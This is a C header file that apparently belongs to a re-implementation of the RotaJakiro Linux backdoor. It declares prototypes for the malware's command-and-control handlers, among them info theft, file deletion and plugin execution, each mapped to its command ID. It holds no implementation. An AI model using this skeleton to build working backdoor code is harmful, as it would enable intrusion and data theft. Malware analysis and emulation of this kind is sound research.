/**
 *@file c2_commands.h
 *
 *@bref This file contains prototypes for the c2 command functions
 * implemented by the "RotaJakiro" (rota) Linux malware documented by 360 Netlab
 *
 *@references
 * - https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
 * - https://blog.netlab.360.com/rotajakiro_linux_version_of_oceanlotus/
 **/

#ifndef C2_COMMANDS_H_
#define C2_COMMANDS_H_


/**
 * @brief main c2 loop to process commands from handler
 * @param N/A
 * */
void c2_loop();

/**
* @brief exit and kill rota via command-id 0x138E3E6
* @params: N/A
*/
void c2_exit(void);

/**
* @brief check if connection is alive via command-id 0x208307A
* TODO: double-verify what check does in binary
*
**/
void c2_test();

/**
* @brief ??? command-id: 0x5CCA727
**/
void c2_heartbeat();

/**
* @brief update the c2 call back time command-id 0x17B1CC4
* @param integer indicating how long to sleep for.
*
* @return N/A
**/
void c2_set_timeout(int sleeptime);

/**
* @brief obtain sensitive info (TODO - what sensitive info) from host machine command-id: 0x25360EA
* @return: a char * to encrypted and compressed data stolen
*/
char *c2_steal_sensitive_info();

/**
* @brief obtain information from /etc/os-release command-id: 0x18320e0
*
*/
void c2_upload_device_info();

/**
* @brief check for the existance of a given file/plugin on the file system 0x2CD9070
* @param fpath file to check exists.
* @return true a file exists, false it does not.
*
*/
bool c2_query_file(char *fpath);


/**
* @brief delete a file/plugin given a specific file path. 0x12B3629
* @param char* of filepath to delete.
* @return boolean indicating success/failure of deleting a file
**/
bool c2_delete_file(char *fpath);

/**
 * @brief Load and run a SO as a "plugin" command-id 0x1B25503
 * @note no public threat intelligence exists about the contents of the plugins executed.
 *
 * @return N/A
 **/
void c2_run_plugin_1();

/**
 * @brief Load and run a SO as a "plugin" command-id 0x1532E65
 * @note no public threat intelligence exists about the contents of the plugins executed.
 *
 * @return N/A
 **/
void c2_run_plugin_2();


/**
 * @brief Load and run a SO as a "plugin" command-id 0x25D5082
 * @note no public threat intelligence exists about the contents of the plugins executed.
 *
 * @return N/A
 **/
void c2_run_plugin_3();

#endif // C2_COMMANDS_H_
